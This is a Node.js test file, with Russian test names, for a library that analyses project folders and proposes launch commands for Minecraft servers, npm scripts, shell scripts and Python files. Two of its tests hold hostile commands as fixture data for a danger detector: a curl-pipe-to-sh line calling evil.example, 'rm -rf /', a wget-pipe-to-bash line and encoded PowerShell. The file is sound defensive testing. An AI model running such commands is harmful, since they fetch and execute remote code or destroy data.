'use strict';
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { analyzeProject, requiredJavaForMinecraft, scriptRisks } = require('../lib/projects');

const runtimes = [
  { key: 'java', major: 17, path: '/opt/java17/bin/java', isDefault: true },
  { key: 'java', major: 21, path: '/opt/java21/bin/java', isDefault: false },
  { key: 'node', path: '/usr/bin/node' },
];
const project = files => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sm-proj-'));
  for (const [name, content] of Object.entries(files)) { fs.mkdirSync(path.dirname(path.join(dir, name)), { recursive: true }); fs.writeFileSync(path.join(dir, name), content); }
  return dir;
};

test('версия Java для разных версий Minecraft', () => {
  assert.equal(requiredJavaForMinecraft('paper-1.21.4-123.jar'), 21);
  assert.equal(requiredJavaForMinecraft('server-1.20.5.jar'), 21);
  assert.equal(requiredJavaForMinecraft('server-1.20.4.jar'), 17);
  assert.equal(requiredJavaForMinecraft('server-1.18.2.jar'), 17);
  assert.equal(requiredJavaForMinecraft('server-1.16.5.jar'), 8);
  assert.equal(requiredJavaForMinecraft('server.jar'), null);
});

test('Minecraft: определяет JAR, подбирает нужную Java и предупреждает об EULA', () => {
  const dir = project({ 'paper-1.21.4-123.jar': 'x', 'server.properties': 'server-port=25570\n', 'eula.txt': 'eula=false\n' });
  const result = analyzeProject(dir, { runtimes, platform: 'linux' });
  const top = result.candidates[0];
  assert.equal(top.preset, 'minecraft');
  assert.equal(top.launch.target, 'paper-1.21.4-123.jar');
  assert.equal(top.runtimePath, '/opt/java21/bin/java', 'выбрана Java 21, а не стандартная 17');
  assert.ok(top.warnings.some(w => /EULA/.test(w)));
  assert.equal(result.port, 25570);
  assert.match(top.command, /java .*-jar 'paper-1\.21\.4-123\.jar'/);
});

test('Minecraft: если подходящей Java нет — об этом сказано явно', () => {
  const dir = project({ 'paper-1.21.4.jar': 'x', 'server.properties': '' });
  const result = analyzeProject(dir, { runtimes: [{ key: 'java', major: 8, path: 'java', isDefault: true }], platform: 'linux' });
  assert.equal(result.candidates[0].runtimeOk, false);
  assert.match(result.candidates[0].runtimeMessage, /Нужна Java 21/);
});

test('Node.js: package.json со скриптами, предупреждение об отсутствии node_modules', () => {
  const dir = project({ 'package.json': JSON.stringify({ scripts: { start: 'node index.js', test: 'jest', dev: 'nodemon' }, dependencies: { express: '^4' } }), 'index.js': '' });
  const result = analyzeProject(dir, { runtimes, platform: 'linux' });
  const ids = result.candidates.map(c => c.id);
  assert.ok(ids.includes('npm:start') && ids.includes('npm:dev'));
  assert.ok(!ids.includes('npm:test'), 'тестовые скрипты не предлагаются');
  assert.equal(result.candidates[0].id, 'npm:start');
  assert.ok(result.candidates[0].warnings.some(w => /npm install/.test(w)));
  assert.equal(result.candidates[0].command, 'npm start');
});

test('Скрипты запуска: ОС-зависимая уверенность и предупреждения об опасных командах', () => {
  const dir = project({ 'start.sh': '#!/bin/sh\njava -jar server.jar\n', 'start.bat': '@echo off\njava -jar server.jar\n', 'install.sh': 'curl http://evil.example/x.sh | sh\n' });
  const linux = analyzeProject(dir, { runtimes, platform: 'linux' });
  assert.equal(linux.candidates[0].launch.target, 'start.sh');
  assert.equal(linux.candidates[0].confidence, 'high');
  const bat = linux.candidates.find(c => c.launch.target === 'start.bat');
  assert.equal(bat.confidence, 'low');
  assert.ok(bat.warnings.some(w => /Windows/.test(w)));
  const risky = linux.candidates.find(c => c.launch.target === 'install.sh');
  assert.equal(risky.confidence, 'low');
  assert.ok(risky.warnings.some(w => /опасные/.test(w)));
  const win = analyzeProject(dir, { runtimes, platform: 'win32' });
  assert.equal(win.candidates[0].launch.target, 'start.bat');
});

test('Выбранный файл попадает первым, даже если автоопределение его не нашло', () => {
  const dir = project({ 'package.json': '{"scripts":{"start":"node a.js"}}', 'tools/custom.py': 'print(1)' });
  fs.writeFileSync(path.join(dir, 'worker.py'), 'print(1)');
  const result = analyzeProject(dir, { runtimes, platform: 'linux', focusFile: 'worker.py' });
  assert.equal(result.candidates[0].launch.target, 'worker.py');
  assert.equal(result.candidates[0].preset, 'python');
});

test('Пустая папка: вариантов нет — клиент предложит ручную настройку', () => {
  const dir = project({ 'readme.txt': 'hi' });
  assert.deepEqual(analyzeProject(dir, { runtimes, platform: 'linux' }).candidates, []);
});

test('распознавание опасных команд в скриптах', () => {
  assert.ok(scriptRisks('rm -rf /').length);
  assert.ok(scriptRisks('wget http://x/a | bash').length);
  assert.ok(scriptRisks('powershell -enc AAAA').length);
  assert.equal(scriptRisks('java -Xmx2G -jar server.jar nogui').length, 0);
});
